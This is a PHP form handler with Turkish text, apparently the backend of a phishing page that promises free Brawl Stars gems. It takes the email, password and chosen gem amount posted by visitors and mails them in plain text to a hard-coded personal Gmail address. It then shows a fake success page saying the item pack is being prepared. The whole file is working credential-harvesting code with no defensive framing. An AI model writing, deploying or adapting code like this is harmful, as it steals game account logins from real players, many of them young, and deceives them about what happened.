<?php
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header("HTTP/1.1 405 Method Not Allowed");
    exit("405 Method Not Allowed - Sadece POST istekleri kabul edilir");
}
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Formdan gelen verileri al
    $email = $_POST['email'];
    $password = $_POST['password'];
    $secenek = $_POST['secenek'];
    
    // Alıcı e-posta adresi (BURAYA KENDİ E-POSTA ADRESİNİZİ YAZIN)
    $to = "soner27atar@gmail.com";
    
    // E-posta konusu
    $subject = "Yeni Brawl Stars Üyelik Kaydı";
    
    // E-posta içeriği
    $message = "
    <html>
    <head>
        <title>Yeni Brawl Stars Üyelik</title>
        <style>
            body { font-family: Arial, sans-serif; }
            h2 { color: #ffd700; }
            .info { background: #1a1a2e; padding: 20px; border-radius: 10px; }
            p { color: white; }
            strong { color: #4a90e2; }
        </style>
    </head>
    <body>
        <h2>Yeni Brawl Stars Üyelik Bilgileri</h2>
        <div class='info'>
            <p><strong>E-posta:</strong> $email</p>
            <p><strong>Şifre:</strong> $password</p>
            <p><strong>Seçilen Eşya Miktarı:</strong> $secenek 💎</p>
        </div>
    </body>
    </html>
    ";
    
    // E-posta başlıkları
    $headers = "MIME-Version: 1.0" . "\r\n";
    $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
    $headers .= 'From: <brawlstars@example.com>' . "\r\n";
    
    // E-postayı gönder
    $mailSent = mail($to, $subject, $message, $headers);
    
    if ($mailSent) {
        // Başarılı kayıt sayfası
        echo '<!DOCTYPE html>
        <html lang="tr">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Kayıt Başarılı</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    margin: 0;
                    padding: 0;
                    background-color: #1a1a2e;
                    background-image: url("https://i.imgur.com/JV8PHKj.jpg");
                    background-size: cover;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    color: white;
                }
                .success-box {
                    background: rgba(26, 26, 46, 0.9);
                    padding: 40px;
                    border-radius: 15px;
                    text-align: center;
                    border: 2px solid #ffd700;
                    box-shadow: 0 0 25px rgba(255, 215, 0, 0.5);
                    max-width: 500px;
                }
                h1 {
                    color: #ffd700;
                    text-shadow: 0 0 10px rgba(255, 215, 0, 0.5);
                }
                .tick {
                    color: #4a90e2;
                    font-size: 80px;
                    margin-bottom: 20px;
                }
                .btn {
                    display: inline-block;
                    margin-top: 20px;
                    padding: 12px 30px;
                    background: linear-gradient(135deg, #ffd700 0%, #ff8c00 100%);
                    color: #1a1a2e;
                    text-decoration: none;
                    border-radius: 8px;
                    font-weight: bold;
                    transition: all 0.3s;
                }
                .btn:hover {
                    background: linear-gradient(135deg, #ff8c00 0%, #ffd700 100%);
                    box-shadow: 0 0 15px rgba(255, 215, 0, 0.7);
                }
            </style>
        </head>
        <body>
            <div class="success-box">
                <div class="tick">✓</div>
                <h1>KAYIT BAŞARILI!</h1>
                <p>Brawl Stars eşya paketiniz hazırlanıyor. Bilgileriniz kaydedildi.</p>
                <p>En kısa sürede e-posta adresinizden bilgilendirileceksiniz.</p>
                <a href="index.html" class="btn">Ana Sayfaya Dön</a>
            </div>
        </body>
        </html>';
    } else {
        // Hata sayfası
        echo '<!DOCTYPE html>
        <html lang="tr">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Hata Oluştu</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    margin: 0;
                    padding: 0;
                    background-color: #1a1a2e;
                    background-image: url("https://i.imgur.com/JV8PHKj.jpg");
                    background-size: cover;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    color: white;
                }
                .error-box {
                    background: rgba(26, 26, 46, 0.9);
                    padding: 40px;
                    border-radius: 15px;
                    text-align: center;
                    border: 2px solid #e74c3c;
                    box-shadow: 0 0 25px rgba(231, 76, 60, 0.5);
                    max-width: 500px;
                }
                h1 {
                    color: #e74c3c;
                    text-shadow: 0 0 10px rgba(231, 76, 60, 0.5);
                }
                .cross {
                    color: #e74c3c;
                    font-size: 80px;
                    margin-bottom: 20px;
                }
                .btn {
                    display: inline-block;
                    margin-top: 20px;
                    padding: 12px 30px;
                    background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);
                    color: white;
                    text-decoration: none;
                    border-radius: 8px;
                    font-weight: bold;
                    transition: all 0.3s;
                }
                .btn:hover {
                    background: linear-gradient(135deg, #c0392b 0%, #e74c3c 100%);
                    box-shadow: 0 0 15px rgba(231, 76, 60, 0.7);
                }
            </style>
        </head>
        <body>
            <div class="error-box">
                <div class="cross">✗</div>
                <h1>HATA OLUŞTU!</h1>
                <p>Kayıt işlemi sırasında bir hata oluştu.</p>
                <p>Lütfen daha sonra tekrar deneyiniz.</p>
                <a href="index.html" class="btn">Geri Dön</a>
            </div>
        </body>
        </html>';
    }
} else {
    // Doğrudan bu sayfaya erişmeye çalışanları ana sayfaya yönlendir
    header("Location: index.html");
    exit();
}
?>
